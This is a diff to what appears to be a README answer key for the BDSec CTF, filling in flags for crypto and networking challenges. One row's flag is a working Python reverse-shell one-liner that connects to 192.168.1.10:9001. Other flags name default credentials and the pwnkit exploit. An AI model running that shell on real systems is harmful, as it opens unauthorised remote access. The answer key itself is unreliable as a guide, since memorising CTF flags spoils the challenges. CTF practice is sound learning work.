@@ -31,7 +31,7 @@ The goal is to solve cybersecurity tests in various categories. The validation o
 | BDSec License Checker 0x02                                    | Reverse        |  NomanProdhan   | 200     | ✘ | `` |
 | Crypto Code                                    | Crypto        | 1xR1FAT   | 25     | ✔ | `BDSEC{cryp70_and_pyth0n_ar3_aw3s0me}` |
 | [VIPx01](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/VIPx01)                                    | Crypto        | 1xR1FAT   | 25     | ✔ | `BDSEC{crypt0_ar3_aw3s0m3}` |
-| VIPx02                                    | Crypto        | 1xR1FAT   | 25     | ✘ | `` |
+| VIPx02                                    | Crypto        | 1xR1FAT   | 25     | ✘ | `BDSEC{crypt0_ar3_aw3s0m3_&_try_t0_1earn_crypt0}` |
 | [Fake](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/Fake)                                    | Crypto        | 1xR1FAT   | 50     | ✔ | `BDSEC{do3sn't_b3li3ve_1n_unkn0wn_mail}` |
 | [Basically RSA](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/Basically%20RSA)                                    | Crypto        | dyn   | 100     | ✔ | `DSEC{r54_i5_fUn_r16h7?}` |
 | Dominoes                                    | Crypto        | dyn   | 50     | ✘ | `BDSEC{n0t_50_e45y_hUh?_433}` |
@@ -49,19 +49,19 @@ The goal is to solve cybersecurity tests in various categories. The validation o
 | FTP Creads | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{ftpadmin_ftpadmin}` |
 | Uploaded File | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{/files/.hacker.not}` |
 | Log Filer | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{vsftpd.log}` |
-| Project Incharge | Networking        | TareqAhamed   | 50     | ✔ | `` |
+| Project Incharge | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Mark}` |
 | Loooon Looong | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Thu_Jul_14_10:16:59}` |
-| Administrator | Networking        | TareqAhamed   | 50     | ✔ | `` |
+| Administrator | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{demo,demo}` |
 | Shell | Networking        | TareqAhamed   | 50     | ✔ | <details><summary>`BDSEC{....`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
-| Secret Key | Networking        | TareqAhamed   | 50     | ✔ | `` |
+| Secret Key | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{2jo3t12nv51w1pw4wk1kj58s1jb6w0}` |
 | Database Admin | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{root_root}` |
 | HostName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{ftpadmin}` |
 | CodeName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{xenial}` |
-| Server Info | Networking        | TareqAhamed   | 50     | ✔ | `` |
+| Server Info | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Ubuntu_16.04.1_LTS_Xenial_Xerus}` |
 | Service Exploit | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{polkit}` |
-| Exploit Exploit Exploit | Networking        |  marufmurtuza   | 50     | ✔ | `` |
-| Vulnerable Service | Networking        | TareqAhamed   | 50     | ✔ | `` |
-| msg.txt | Networking        | TareqAhamed   | 50     | ✔ | `` |
+| Exploit Exploit Exploit | Networking        |  marufmurtuza   | 50     | ✔ | `BDSEC{pwnkit}` |
+| Vulnerable Service | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{pkexec}` |
+| msg.txt | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{The_Server_Is_Now_under_My_Control_:D_:D}` |
 | Attacker | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{N4N0M473}` |
 | Server User's | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{8}` |  
 
